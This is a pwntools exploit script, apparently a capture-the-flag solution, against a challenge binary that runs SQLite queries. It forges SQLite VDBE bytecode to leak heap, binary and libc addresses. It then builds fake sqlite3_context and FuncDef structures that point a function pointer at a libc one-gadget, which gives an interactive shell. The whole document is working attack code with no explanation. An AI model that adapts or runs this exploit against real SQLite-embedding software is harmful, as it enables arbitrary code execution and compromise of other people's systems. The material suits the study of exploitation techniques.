from pwn import *
elf = ELF("chal_patched")
context.arch = 'x86_64'
libc = ELF("libc.so.6")

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(ip, port)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def new_query(idx, payload):
    sla(':', '1');
    sla('?', f'{idx}');
    sla(':', payload);

def edit_query(idx, count, payload):
    sla(':', '5');
    sla('?', f'{idx}');
    sla('?', f'{count}');
    sla(":", payload);

def exec_query(idx):
    sla(":", '2')
    sla("?", f'{idx}')

def del_query(idx):
    sla(":", '3')
    sla("?", f'{idx}')


new_query(1, b"SELECT 1.1")

def generate_opcode(opcode, p4type, p5, p1, p2, p3, p4):
    payload = p8(opcode) + p8(p4type) + p16(p5) + p32(p1) + p32(p2) + p32(p3) + p64(p4)
    return payload

def leak_val(addr):
    bytecode = generate_opcode(8, 0, 0, 0, 4, 0, 0) + p8(72) + p8(243) + p16(0) + p32(0) + p32(1) + p32(0) + addr
    sl(b"5\n1\n" + str(len(bytecode)).encode());
    sl(bytecode)
    sla(b"It has been done.", b"2")
    sl(b"1")
    ru(b"? ")
    return int(rl().decode().split(",")[0])

heap = leak_val(b"\xe0")
heap = heap - 0xe008
log.info("heap --> " + hex(heap))
baseleak = leak_val(p64(heap + 0x640))
base_addr = baseleak - 0xe3d87
log.info("base addr --> " + hex(base_addr))
printf = leak_val(p64(base_addr + 0x11aed8))
libc.address = printf - 0x606f0
log.info("libc --> " + hex(libc.address))
oneGadget = libc.address + 0xebc88
ptr1 = heap + 0xabe8
# craft sqlite3_context
# struct sqlite3_context {
#   Mem *pOut;              /* The return value is stored here */
#   FuncDef *pFunc;         /* Pointer to function information */
#   Mem *pMem;              /* Memory cell used to store aggregate context */
#   Vdbe *pVdbe;            /* The VM that owns this context */
#   int iOp;                /* Instruction number of OP_Function */
#   int isError;            /* Error code returned by the function. */
#   u8 enc;                 /* Encoding to use for results */
#   u8 skipFlag;            /* Skip accumulator loading if true */
#   u8 argc;                /* Number of arguments */
#   sqlite3_value *argv[1]; /* Argument set */
# };
payload = p64(0)
payload += p64(ptr1+0x38)
payload += p64(0)
payload += p64(0)
payload += p32(0) + p32(0)
payload += p8(0) + p8(0)
payload += p16(0) + p32(0)
payload += p64(ptr1 + 100)

# craft FuncDef 
# struct FuncDef {
#   i8 nArg;             /* Number of arguments.  -1 means unlimited */
#   u32 funcFlags;       /* Some combination of SQLITE_FUNC_* */
#   void *pUserData;     /* User data parameter */
#   FuncDef *pNext;      /* Next function with same name */
#   void (*xSFunc)(sqlite3_context*,int,sqlite3_value**); /* func or agg-step */
#   void (*xFinalize)(sqlite3_context*);                  /* Agg finalizer */
#   void (*xValue)(sqlite3_context*);                     /* Current agg value */
#   void (*xInverse)(sqlite3_context*,int,sqlite3_value**); /* inverse agg-step */
#   const char *zName;   /* SQL name of the function. */
#   union {
#     FuncDef *pHash;      /* Next with a different name but the same hash */
#     FuncDestructor *pDestructor;   /* Reference counted destructor function */
#   } u; /* pHash if SQLITE_FUNC_BUILTIN, pDestructor otherwise */
# };

payload += p8(0)
payload += p8(0) + p16(0)
payload += p32(0) + p64(0)
payload += p64(0) + p64(oneGadget)
payload = payload.ljust(120, b"\x00")

edit_query(1, len(payload), payload)
new_query(2, b"SELECT 1.0")
bytecode = generate_opcode(66, 241, 0, 0, 0, 0, ptr1)
edit_query(2, len(bytecode), bytecode)
exec_query(2)


r.interactive()